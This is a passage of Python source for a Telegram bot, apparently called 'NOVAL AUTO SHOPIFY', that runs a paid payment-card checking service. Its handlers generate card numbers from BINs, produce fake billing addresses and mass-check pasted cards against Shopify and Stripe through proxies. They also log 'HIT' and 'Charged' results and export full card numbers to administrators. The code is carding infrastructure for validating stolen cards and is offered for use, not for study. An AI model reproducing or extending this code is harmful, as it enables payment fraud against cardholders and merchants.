    await cb.answer(f"Send payment to: {wallet}\nAfter paying, contact @Senselessme",
                    show_alert=True)

# ── Tools callbacks ───────────────────────────────────────────────────────
@router.callback_query(F.data == "tool:bin")
async def cb_tool_bin(cb: CallbackQuery):
    text = (
        f"{pe('diamond')} <b>{sc('BIN Lookup')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('docs')} <b>{sc('Send BIN or use command')}:</b>\n"
        f"<blockquote>{pe('pen')} {sc('Command')}: <code>/bin 401234</code></blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        pbtn(sc("Back"), icon="back", color="primary", callback_data="menu:tools")
    ]])
    await safe_edit_media(cb, random.choice(VIDEOS), text, kb)
    await cb.answer()

@router.callback_query(F.data == "tool:addr")
async def cb_tool_addr(cb: CallbackQuery):
    text = (
        f"{pe('user')} <b>{sc('Address Generator')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('docs')} <b>{sc('Use command to generate')}:</b>\n"
        f"<blockquote>{pe('pen')} <code>/addr</code></blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Generate Now"), icon="refresh", color="success",
              callback_data="tool:addr_gen")],
        [pbtn(sc("Back"), icon="back", color="primary", callback_data="menu:tools")],
    ])
    await safe_edit_media(cb, random.choice(VIDEOS), text, kb)
    await cb.answer()

@router.callback_query(F.data == "tool:addr_gen")
async def cb_tool_addr_gen(cb: CallbackQuery):
    countries = [
        ("US","New York","NY","10001"),("US","Los Angeles","CA","90001"),
        ("UK","London","LDN","EC1A"),("CA","Toronto","ON","M5V"),
        ("AU","Sydney","NSW","2000"),("DE","Berlin","BE","10115"),
        ("FR","Paris","IDF","75001"),("JP","Tokyo","TK","100-0001"),
        ("BR","Sao Paulo","SP","01000"),("IN","Mumbai","MH","400001"),
        ("ZA","Cape Town","WC","8001"),("NG","Lagos","LA","100001"),
        ("MX","Mexico City","CMX","01000"),("ES","Madrid","MD","28001"),
        ("IT","Rome","RM","00100"),("RU","Moscow","MOW","101000"),
        ("TR","Istanbul","IST","34000"),("AE","Dubai","DXB","00000"),
        ("SG","Singapore","SG","018956"),("HK","Hong Kong","HK","999077"),
    ]
    streets = ["Main St","Park Ave","Oak Dr","Pine Ln","Cedar Rd",
               "Maple Ct","High St","Station Rd","Church Ln","Victoria Rd"]
    country, city, state, zip_code = random.choice(countries)
    street = f"{random.randint(100, 9999)} {random.choice(streets)}"
    text = (
        f"{pe('user')} <b>{sc('Generated Address')} ({country})</b>\n"
        f"<blockquote>"
        f"{pe('link')} <b>Street:</b> <code>{street}</code>\n"
        f"{pe('shop')} <b>City:</b> <code>{city}</code>\n"
        f"{pe('diamond')} <b>State:</b> <code>{state}</code>\n"
        f"{pe('num1')} <b>ZIP:</b> <code>{zip_code}</code>\n"
        f"{pe('star')} <b>Country:</b> <code>{country}</code>"
        f"</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Generate Again"), icon="refresh", color="success",
              callback_data="tool:addr_gen")],
        [pbtn(sc("Back"), icon="back", color="primary", callback_data="menu:tools")],
    ])
    await safe_edit_media(cb, random.choice(VIDEOS), text, kb)
    await cb.answer()

@router.callback_query(F.data == "tool:format")
async def cb_tool_format(cb: CallbackQuery):
    text = (
        f"{pe('pen')} <b>{sc('CC Formatter')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('docs')} <b>{sc('Send CC or use command')}:</b>\n"
        f"<blockquote>{pe('pen2')} <code>/format 4111111111111111|12|25|123</code>\n"
        f"{pe('star')} {sc('Accepts any separator')}: <code>|</code> <code> </code> <code>/</code> <code>-</code></blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        pbtn(sc("Back"), icon="back", color="primary", callback_data="menu:tools")
    ]])
    await safe_edit_media(cb, random.choice(VIDEOS), text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("gen:"))
async def cb_gen(cb: CallbackQuery):
    try:
        prefix = cb.data.split(':')[1]
        cards = generate_cc(prefix, 10)
        text = (f"{pe('check')} <b>10 {sc('Generated Cards')}</b>\n"
                f"<blockquote><code>{chr(10).join(cards)}</code></blockquote>")
        await safe_edit_media(cb, random.choice(VIDEOS), text, back_kb())
        await cb.answer()
    except Exception as e:
        await cb.answer(f"Error: {e}", show_alert=True)

# ── Mass start / cancel (matches _pending_mass from Part 4) ───────────────
@router.callback_query(F.data.startswith("mass_start:"))
async def cb_mass_start(cb: CallbackQuery):
    _cleanup_pending_mass()
    token = cb.data.split(":", 1)[1]
    entry = _pending_mass.pop(token, None)
    if not entry:
        return await cb.answer("Expired — paste cards again", show_alert=True)
    if entry["uid"] != cb.from_user.id and not is_admin(cb.from_user.id):
        return await cb.answer("Not yours", show_alert=True)
    cards = entry["ccs"]
    mode = entry.get("mode", "shopify")
    await cb.answer(f"Starting {len(cards)} ({mode})...")
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    if len(cards) == 1:
        await process_check_logic(cb.message, cards[0], cb.bot,
                                  uid=cb.from_user.id,
                                  username=cb.from_user.username or "",
                                  mode=mode)
    else:
        await run_mass_check(cb.message, cards, cb.bot,
                             bypass_quota=is_admin(cb.from_user.id),
                             uid=cb.from_user.id,
                             username=cb.from_user.username or "",
                             mode=mode)

@router.callback_query(F.data.startswith("mass_cancel:"))
async def cb_mass_cancel(cb: CallbackQuery):
    _pending_mass.pop(cb.data.split(":", 1)[1], None)
    try: await cb.message.delete()
    except: pass
    await cb.answer("Cancelled")

@router.callback_query(F.data.startswith("mc:cancel:"))
async def cb_mc_cancel(cb: CallbackQuery):
    ev = _mass_tasks.get(cb.data.split(":", 2)[2])
    if ev:
        ev.set(); await cb.answer("Cancelling...")
    else:
        await cb.answer("Done")

# ── Recheck / Save ────────────────────────────────────────────────────────
@router.callback_query(F.data.startswith("recheck:"))
async def cb_recheck(cb: CallbackQuery):
    parts = cb.data.split(":", 2)
    if len(parts) == 3:
        mode, cc = parts[1], parts[2]
    else:
        mode, cc = "shopify", parts[1]
    try: await cb.answer("Rechecking...")
    except: pass
    if CC_REGEX.match(cc):
        await process_check_logic(cb.message, cc, cb.bot,
                                  uid=cb.from_user.id,
                                  username=cb.from_user.username or "",
                                  mode=mode)

@router.callback_query(F.data.startswith("save:"))
async def cb_save(cb: CallbackQuery):
    with db() as c:
        c.execute("INSERT OR IGNORE INTO saved_cards(uid, cc, saved_at) VALUES (?,?,?)",
                  (cb.from_user.id, cb.data.split(":", 1)[1],
                   datetime.now(timezone.utc).isoformat()))
    await cb.answer("Saved to Wishlist")

# ── Verify sub ────────────────────────────────────────────────────────────
@router.callback_query(F.data == "verify_sub")
async def cb_verify(cb: CallbackQuery):
    if await check_force_sub(cb.bot, cb.from_user.id):
        try: await cb.message.delete()
        except: pass
        user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
        streak = apply_streak(cb.from_user.id)
        caption = welcome_text(user, cb.from_user.first_name)
        if streak["reward"]:
            caption += f"\n\n{pe('star')} <b>{sc('Streak Reward')}!</b> {streak['reward']}"
        media = get_setting("asset_VID_MAIN") or random.choice(VIDEOS)
        try:
            await cb.bot.send_video(chat_id=cb.from_user.id, video=media,
                                    caption=caption, parse_mode="HTML",
                                    reply_markup=main_menu_kb(cb.from_user.id))
        except: pass
    else:
        await cb.answer("Join all channels first", show_alert=True)
    try: await cb.answer()
    except: pass

# ── Stars purchase ────────────────────────────────────────────────────────
@router.callback_query(F.data.startswith("buy:"))
async def cb_buy(cb: CallbackQuery):
    prod = STAR_PRODUCTS.get(cb.data.split(":", 1)[1])
    if not prod:
        return await cb.answer("Invalid", show_alert=True)
    try:
        await cb.bot.send_invoice(
            chat_id=cb.from_user.id,
            title=f"Noval · {prod['label']}",
            description=f"{prod['plan'].title()} for {prod['days']}d",
            payload=f"plan:{prod['plan']}:{prod['days']}",
            provider_token="", currency="XTR",
            prices=[LabeledPrice(label=prod["label"], amount=prod["stars"])])
    except Exception as e:
        return await cb.answer(f"Error: {e}", show_alert=True)
    await cb.answer()

@router.pre_checkout_query()
async def pre_checkout(q: PreCheckoutQuery):
    try: await q.answer(ok=True)
    except: pass

@router.message(F.successful_payment)
async def on_paid(msg: Message):
    sp = msg.successful_payment
    if not sp: return
    ensure_user(msg.from_user.id, msg.from_user.username or "")
    parts = (sp.invoice_payload or "").split(":")
    if len(parts) == 3 and parts[0] == "plan":
        try: days = int(parts[2])
        except: days = 30
        upgrade_user(msg.from_user.id, parts[1], days)
        try:
            await msg.answer(
                f"{pe('check')} <b>{sc('Paid')}</b>\n"
                f"<blockquote>{pe('gem')} <b>{PLANS[parts[1]]['name']}</b> · {days}d</blockquote>",
                parse_mode="HTML")
        except: pass

# ── Menu:admin_panel entry ────────────────────────────────────────────────
@router.callback_query(F.data == "menu:admin_panel")
@router.callback_query(F.data == "admin:main")
async def cb_admin_main(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return await cb.answer("Not admin", show_alert=True)
    set_awaiting(cb.from_user.id, '')
    if is_limited_admin(cb.from_user.id) and not is_full_admin(cb.from_user.id):
        await edit_admin(
            cb,
            f"{pe('settings')} <b>{sc('Admin Panel')}</b>\n"
            f"<blockquote>{pe('user')} {sc('Limited Admin')}</blockquote>",
            admin_main_kb(cb.from_user.id))
        return await cb.answer()
    await edit_admin(cb, f"{pe('settings')} <b>{sc('Admin Panel')}</b>",
                     admin_main_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "admin:close")
async def cb_admin_close(cb: CallbackQuery):
    try: await cb.message.delete()
    except: pass
    await cb.answer()
    # ═══════════════════════════════════════════════════════════════════════════
# ADMIN CALLBACKS
# ═══════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data == "admin:stats")
async def cb_admin_stats(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        total_users = c.execute("SELECT COUNT(*) as n FROM users").fetchone()["n"]
        total_checks = c.execute("SELECT COUNT(*) as n FROM check_logs").fetchone()["n"]
        total_hits = c.execute("SELECT COUNT(*) as n FROM check_logs WHERE status='HIT'").fetchone()["n"]
        today_date = datetime.now(timezone.utc).date().isoformat()
        today_checks = c.execute("SELECT COUNT(*) as n FROM check_logs WHERE ts LIKE ?",
                                 (f"{today_date}%",)).fetchone()["n"]
        charged_hits = c.execute("SELECT COUNT(*) as n FROM charged_hits").fetchone()["n"]
        total_proxies = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE status='live'").fetchone()["n"]
        pending_fb = c.execute("SELECT COUNT(*) as n FROM feedback WHERE status='pending'").fetchone()["n"]
        err_count = c.execute("SELECT COUNT(*) as n FROM check_logs WHERE status IN ('ERROR','PROXY_ERROR','TIMEOUT')").fetchone()["n"]
        db_size = os.path.getsize(DB_PATH) / (1024 * 1024) if os.path.exists(DB_PATH) else 0
    text = (
        f"📊 <b>[=] Master Dashboard</b>\n"
        f"<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 <b>Users</b> ~ {total_users:,}\n"
        f"🛒 <b>Total Checks</b> ~ {total_checks:,}\n"
        f"📅 <b>Today Checks</b> ~ {today_checks:,}\n"
        f"✅ <b>Total Hits</b> ~ {total_hits:,}\n"
        f"💎 <b>Charged Hits</b> ~ {charged_hits:,}\n"
        f"🔗 <b>Live Proxies</b> ~ {total_proxies:,}\n"
        f"⚠️ <b>Errors</b> ~ {err_count:,}\n"
        f"📩 <b>Pending FB</b> ~ {pending_fb:,}\n"
        f"💾 <b>DB Size</b> ~ {db_size:.2f} MB\n"
        f"━━━━━━━━━━━━━━━━━━━━</blockquote>"
    )
    await edit_admin(cb, text, admin_main_kb(cb.from_user.id))
    await cb.answer()

# ── Check Logs (NEW — per-CC response viewer) ─────────────────────────────
@router.callback_query(F.data == "admin:check_logs")
async def cb_admin_check_logs(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        total = c.execute("SELECT COUNT(*) as n FROM check_logs").fetchone()["n"]
        hits = c.execute("SELECT COUNT(*) as n FROM check_logs WHERE status='HIT'").fetchone()["n"]
        decl = c.execute("SELECT COUNT(*) as n FROM check_logs WHERE status='DECLINED'").fetchone()["n"]
        errs = c.execute("SELECT COUNT(*) as n FROM check_logs WHERE status IN ('ERROR','PROXY_ERROR','TIMEOUT','SITE_ERROR')").fetchone()["n"]
    text = (
        f"📋 <b>[=] Check Logs Manager</b>\n"
        f"<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 <b>Total:</b> {total:,}\n"
        f"✅ <b>Hits:</b> {hits:,}\n"
        f"❌ <b>Declined:</b> {decl:,}\n"
        f"⚠️ <b>Errors:</b> {errs:,}\n"
        f"━━━━━━━━━━━━━━━━━━━━</blockquote>\n"
        f"<i>Select a filter to view or export</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Recent 30"), icon="docs", color="primary",
              callback_data="admin:cl:recent"),
         pbtn(sc("All Hits"), icon="check", color="success",
              callback_data="admin:cl:hits")],
        [pbtn(sc("Declined"), icon="cross2", color="danger",
              callback_data="admin:cl:declined"),
         pbtn(sc("Errors"), icon="warn_red", color="danger",
              callback_data="admin:cl:errors")],
        [pbtn(sc("Export All (.txt)"), icon="docs", color="success",
              callback_data="admin:cl:export"),
         pbtn(sc("Clear Old (30d+)"), icon="trash", color="danger",
              callback_data="admin:cl:purge")],
        [pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:cl:"))
async def cb_admin_cl_filter(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    filt = cb.data.split(":")[2]

    if filt == "purge":
        cutoff = (datetime.now(timezone.utc) - timedelta(days=30)).isoformat()
        with db() as c:
            n = c.execute("SELECT COUNT(*) as n FROM check_logs WHERE ts < ?", (cutoff,)).fetchone()["n"]
            c.execute("DELETE FROM check_logs WHERE ts < ?", (cutoff,))
        await cb.answer(f"Purged {n} old logs", show_alert=True)
        return await cb_admin_check_logs(cb)

    if filt == "export":
        with db() as c:
            rows = c.execute("SELECT uid, cc, response, status, mode, ts FROM check_logs "
                             "ORDER BY id DESC LIMIT 5000").fetchall()
        if not rows:
            return await cb.answer("No logs to export", show_alert=True)
        lines = [f"# Check Logs Export · {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                 f"# Total: {len(rows)}", ""]
        for r in rows:
            lines.append(f"{r['cc']} | {r['status']} | {r['mode']} | "
                         f"{r['response'][:80]} | uid={r['uid']} | {r['ts']}")
        data = "\n".join(lines).encode("utf-8")
        fname = f"checklogs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        try:
            await cb.message.answer_document(
                BufferedInputFile(data, filename=fname),
                caption=f"📋 <b>{len(rows)} logs exported</b>",
                parse_mode="HTML")
        except Exception as e:
            await cb.answer(f"Failed: {e}", show_alert=True)
        return await cb.answer()

    # recent / hits / declined / errors
    if filt == "recent":
        q = "SELECT uid, cc, response, status, mode, ts FROM check_logs ORDER BY id DESC LIMIT 20"
    elif filt == "hits":
        q = "SELECT uid, cc, response, status, mode, ts FROM check_logs WHERE status='HIT' ORDER BY id DESC LIMIT 20"
    elif filt == "declined":
        q = "SELECT uid, cc, response, status, mode, ts FROM check_logs WHERE status='DECLINED' ORDER BY id DESC LIMIT 20"
    else:  # errors
        q = "SELECT uid, cc, response, status, mode, ts FROM check_logs WHERE status IN ('ERROR','PROXY_ERROR','TIMEOUT','SITE_ERROR') ORDER BY id DESC LIMIT 20"

    with db() as c:
        rows = c.execute(q).fetchall()
    if not rows:
        return await cb.answer("No logs found", show_alert=True)

    lines = [f"📋 <b>{filt.upper()} Logs</b> (last {len(rows)})\n<blockquote>"]
    for r in rows:
        icon = {"HIT": "✅", "DECLINED": "❌", "ERROR": "⚠️",
                "PROXY_ERROR": "🌐", "TIMEOUT": "⏱", "SITE_ERROR": "🏚"}.get(r["status"], "•")
        masked = _mask_cc(r["cc"])
        mode_tag = "S" if r["mode"] == "shopify" else "A"
        lines.append(
            f"{icon} <code>{masked}</code> [{mode_tag}]\n"
            f"   ↳ {esc(r['response'][:50])} · <i>uid:{r['uid']}</i>")
    lines.append("</blockquote>")
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:check_logs")
    ]])
    await edit_admin(cb, "\n".join(lines), kb)
    await cb.answer()

# ── Error Logs (NEW — with traceback) ─────────────────────────────────────
@router.callback_query(F.data == "admin:error_logs")
async def cb_admin_error_logs(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        rows = c.execute(
            "SELECT uid, cc, response, status, mode, error_trace, ts FROM check_logs "
            "WHERE status IN ('ERROR','PROXY_ERROR','TIMEOUT','SITE_ERROR') "
            "ORDER BY id DESC LIMIT 15").fetchall()
        total_err = c.execute(
            "SELECT COUNT(*) as n FROM check_logs "
            "WHERE status IN ('ERROR','PROXY_ERROR','TIMEOUT','SITE_ERROR')").fetchone()["n"]
    if not rows:
        return await cb.answer("No errors logged 🎉", show_alert=True)
    lines = [f"⚠️ <b>[=] Error Logs</b>\n<blockquote>Total: <b>{total_err:,}</b></blockquote>\n"]
    for r in rows:
        masked = _mask_cc(r["cc"])
        trace_preview = (r["error_trace"] or "")[-200:].replace("\n", " ")[:150]
        lines.append(
            f"<blockquote>"
            f"🔴 <b>{r['status']}</b> · <code>{masked}</code> [{r['mode']}]\n"
            f"↳ {esc(r['response'][:80])}\n"
            f"↳ <i>{esc(trace_preview or 'no trace')}</i>\n"
            f"↳ uid:{r['uid']} · {esc(r['ts'][:16])}"
            f"</blockquote>")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Export Errors"), icon="docs", color="success",
              callback_data="admin:err:export")],
        [pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, "\n".join(lines), kb)
    await cb.answer()

@router.callback_query(F.data == "admin:err:export")
async def cb_admin_err_export(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        rows = c.execute(
            "SELECT uid, cc, response, status, mode, error_trace, ts FROM check_logs "
            "WHERE status IN ('ERROR','PROXY_ERROR','TIMEOUT','SITE_ERROR') "
            "ORDER BY id DESC LIMIT 1000").fetchall()
    if not rows:
        return await cb.answer("No errors", show_alert=True)
    lines = [f"# Error Logs Export · {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", ""]
    for r in rows:
        lines.append(f"=== {r['ts']} · uid={r['uid']} · mode={r['mode']} ===")
        lines.append(f"CC: {r['cc']}")
        lines.append(f"Status: {r['status']}")
        lines.append(f"Response: {r['response']}")
        lines.append(f"Trace: {r['error_trace'] or 'none'}")
        lines.append("")
    data = "\n".join(lines).encode("utf-8")
    fname = f"errors_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        await cb.message.answer_document(
            BufferedInputFile(data, filename=fname),
            caption=f"⚠️ <b>{len(rows)} errors exported</b>",
            parse_mode="HTML")
    except Exception as e:
        await cb.answer(f"Failed: {e}", show_alert=True)
    await cb.answer()

# ── Stripe SK ─────────────────────────────────────────────────────────────
@router.callback_query(F.data == "admin:set_stripe_sk")
async def cb_admin_set_stripe_sk(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    current = get_setting("stripe_sk", "")
    masked = (current[:10] + "..." + current[-4:]) if current and len(current) > 14 else "Not Set"
    set_awaiting(cb.from_user.id, "set_setting:stripe_sk")
    await edit_admin(
        cb,
        f"{pe('gem')} <b>{sc('Stripe Secret Key')}</b>\n"
        f"<blockquote>{pe('docs')} {sc('Current')}: <code>{esc(masked)}</code>\n"
        f"{pe('pen')} {sc('Send new SK (sk_live_... or sk_test_...)')}</blockquote>",
        InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:main")
        ]]))
    await cb.answer()

# ── Bot Settings ──────────────────────────────────────────────────────────
@router.callback_query(F.data == "admin:bot_settings")
async def cb_admin_bot_settings(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    text = (
        f"⚙️ <b>[=] Bot Settings</b>\n"
        f"<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Bot Name:</b> <code>{get_setting('bot_name', 'NOVAL AUTO SHOPIFY')}</code>\n"
        f"<b>Support Link:</b> <code>{get_setting('support_link', 'https://t.me/Senselessme')}</code>\n"
        f"<b>Hit Log:</b> <code>{get_setting('hit_log_channel') or 'Not Set'}</code>\n"
        f"<b>Force/Public GC:</b> <code>{get_setting('public_gc_id') or 'Not Set'}</code>\n"
        f"<b>Charged GC:</b> <code>{get_setting('charged_gc_id') or 'Not Set'}</code>\n"
        f"<b>Stripe SK:</b> <code>{'Set ✓' if get_setting('stripe_sk') else 'Not Set ✗'}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Bot Name", icon="pen", color="primary",
              callback_data="admin:set_setting:bot_name"),
         pbtn("Support Link", icon="link", color="primary",
              callback_data="admin:set_setting:support_link")],
        [pbtn("Hit Log Channel", icon="gem", color="success",
              callback_data="admin:set_setting:hit_log_channel"),
         pbtn("Force/Public GC", icon="chat", color="success",
              callback_data="admin:set_setting:public_gc_id")],
        [pbtn("Charged GC", icon="gem2", color="success",
              callback_data="admin:set_setting:charged_gc_id"),
         pbtn("Stripe SK", icon="gem", color="success",
              callback_data="admin:set_stripe_sk")],
        [pbtn("FB Channels", icon="chat", color="primary",
              callback_data="admin:fb_channels"),
         pbtn("Scrapper GCs", icon="ghost", color="primary",
              callback_data="admin:scrapper_mgr")],
        [pbtn("Back", icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:set_setting:"))
async def cb_admin_set_setting_prompt(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    key = cb.data.split(":", 2)[2]
    set_awaiting(cb.from_user.id, f"set_setting:{key}")
    await edit_admin(cb, f"{pe('pen')} Send new value for <b>{key}</b>:\n"
                         f"<i>(send 'off' to clear)</i>", back_kb())
    await cb.answer()

# ── FB Channels ───────────────────────────────────────────────────────────
@router.callback_query(F.data == "admin:fb_channels")
async def cb_admin_fb_channels(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    ch1 = get_setting("fb_channel_id") or sc("Not set")
    ch2 = get_setting("fb_channel_id2") or sc("Not set")
    auto = get_setting("auto_post_chat") or sc("Not set")
    text = (
        f"{pe('chat')} <b>{sc('Feedback Channels')}</b>\n"
        f"<blockquote>{pe('link')} {sc('Channel 1')}: <code>{esc(ch1)}</code>\n"
        f"{pe('link')} {sc('Channel 2')}: <code>{esc(ch2)}</code>\n"
        f"{pe('bell')} {sc('Auto Post')}: <code>{esc(auto)}</code></blockquote>"
        f"<i>Approved feedback goes to all three + Hit Log channel</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Set Channel 1"), icon="pen", color="success",
              callback_data="admin:set_fb_ch:1")],
        [pbtn(sc("Set Channel 2"), icon="pen", color="success",
              callback_data="admin:set_fb_ch:2")],
        [pbtn(sc("Set Auto Post"), icon="bell", color="primary",
              callback_data="admin:set_setting:auto_post_chat")],
        [pbtn(sc("Back"), icon="back", color="primary", callback_data="admin:bot_settings")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data.startswith("admin:set_fb_ch:"))
async def cb_set_fb_ch(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    n = cb.data.split(":")[2]
    key = "fb_channel_id" if n == "1" else "fb_channel_id2"
    set_awaiting(cb.from_user.id, f"set_setting:{key}")
    await edit_admin(
        cb,
        f"{pe('pen')} <b>{sc('Set Feedback Channel')} {n}</b>\n"
        f"<blockquote>{sc('Send channel ID like')} <code>-1001234567890</code></blockquote>",
        InlineKeyboardMarkup(inline_keyboard=[[
            pbtn(sc("Back"), icon="back", color="primary",
                  callback_data="admin:fb_channels")
        ]]))
    await cb.answer()

# ── User Manager (detailed search) ────────────────────────────────────────
@router.callback_query(F.data == "admin:user_mgr")
async def cb_admin_user_mgr(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_user_search")
    await edit_admin(
        cb,
        f"🔍 <b>[=] User Manager</b>\n\n"
        f"<blockquote>Send <b>User ID (UID)</b> to view detailed info,\n"
        f"give credits, give premium, or ban/unban.</blockquote>",
        back_kb())
    await cb.answer()

@router.callback_query(F.data.startswith("admin:ban_user:"))
async def cb_admin_ban_user(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    target_uid = int(cb.data.split(":")[2])
    ensure_user(target_uid)
    with db() as c:
        u = c.execute("SELECT banned FROM users WHERE uid=?", (target_uid,)).fetchone()
        nv = 0 if (u and u["banned"]) else 1
        c.execute("UPDATE users SET banned=? WHERE uid=?", (nv, target_uid))
    await cb.answer(f"User {'Unbanned ✓' if nv == 0 else 'Banned ✗'}", show_alert=True)

@router.callback_query(F.data.startswith("admin:give_credits:"))
async def cb_admin_give_credits(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    target_uid = int(cb.data.split(":")[2])
    set_awaiting(cb.from_user.id, f"give_credits:{target_uid}")
    await edit_admin(cb, f"💳 Send amount of credits for <code>{target_uid}</code>:",
                     back_kb())
    await cb.answer()

@router.callback_query(F.data.startswith("admin:give_premium:"))
async def cb_admin_give_premium(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    target_uid = int(cb.data.split(":")[2])
    upgrade_user(target_uid, "premium", 30)
    await cb.answer(f"✅ Premium (30d) given to {target_uid}!", show_alert=True)

# ── System Logs ───────────────────────────────────────────────────────────
@router.callback_query(F.data == "admin:sys_logs")
async def cb_admin_sys_logs(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    import platform
    uptime = int(time.time() - START_TIME)
    cpu, ram = 0, 0
    try:
        import psutil
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
    except: pass
    with db() as c:
        total_logs = c.execute("SELECT COUNT(*) as n FROM check_logs").fetchone()["n"]
        err_logs = c.execute("SELECT COUNT(*) as n FROM check_logs WHERE status IN ('ERROR','PROXY_ERROR','TIMEOUT')").fetchone()["n"]
    text = (
        f"📝 <b>[=] System Health</b>\n"
        f"<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
        f"💻 <b>CPU:</b> {cpu}%\n"
        f"🧠 <b>RAM:</b> {ram}%\n"
        f"⏱ <b>Uptime:</b> {uptime // 3600}h {(uptime % 3600) // 60}m\n"
        f"🌐 <b>OS:</b> {platform.system()}\n"
        f"📋 <b>Total Logs:</b> {total_logs:,}\n"
        f"⚠️ <b>Errors:</b> {err_logs:,}\n"
        f"━━━━━━━━━━━━━━━━━━━━</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn("Recent Checks", icon="docs", color="primary",
              callback_data="admin:recent_checks"),
         pbtn("Error Logs", icon="warn_red", color="danger",
              callback_data="admin:error_logs")],
        [pbtn("Top Checkers", icon="chart", color="primary",
              callback_data="admin:top_checkers")],
        [pbtn("Back", icon="back", color="primary", callback_data="admin:main")],
    ])
    await edit_admin(cb, text, kb)
    await cb.answer()

@router.callback_query(F.data == "admin:recent_checks")
async def cb_admin_recent_checks(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        rows = c.execute("SELECT cc, response, status, mode FROM check_logs ORDER BY id DESC LIMIT 15").fetchall()
    if not rows:
        return await cb.answer("No checks yet", show_alert=True)
    text = "📝 <b>Recent Checks</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
    for r in rows:
        icon = {"HIT": "✅", "DECLINED": "❌"}.get(r["status"], "⚠️")
        text += f"{icon} <code>{_mask_cc(r['cc'])}</code> [{r['mode'][:1].upper()}] | {esc(r['response'][:18])}\n"
    text += "━━━━━━━━━━━━━━━━━━━━</blockquote>"
    await edit_admin(cb, text, InlineKeyboardMarkup(inline_keyboard=[[
        pbtn("Back", icon="back", color="primary", callback_data="admin:sys_logs")
    ]]))
    await cb.answer()

@router.callback_query(F.data == "admin:top_checkers")
async def cb_admin_top_checkers(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        rows = c.execute("SELECT uid, username, total_hits FROM users "
                         "WHERE total_hits > 0 ORDER BY total_hits DESC LIMIT 10").fetchall()
    text = "🏆 <b>Top Checkers</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
    for i, r in enumerate(rows, 1):
        text += f"{i}. <code>{r['uid']}</code> ({esc(r['username'] or 'N/A')}) ~ <b>{r['total_hits']} hits</b>\n"
    text += "━━━━━━━━━━━━━━━━━━━━</blockquote>"
    await edit_admin(cb, text, InlineKeyboardMarkup(inline_keyboard=[[
        pbtn("Back", icon="back", color="primary", callback_data="admin:sys_logs")
    ]]))
    await cb.answer()

# ── Charged Logs (legacy) ─────────────────────────────────────────────────
@router.callback_query(F.data == "admin:charged_logs")
async def cb_admin_charged_logs(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c:
        total = c.execute("SELECT COUNT(*) as n FROM charged_hits").fetchone()["n"]
    text = (
        f"💎 <b>[=] Charged Hits Export</b>\n"
        f"<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Total Saved Hits:</b> {total}\n\n"
        f"Select a filter to download.\n"
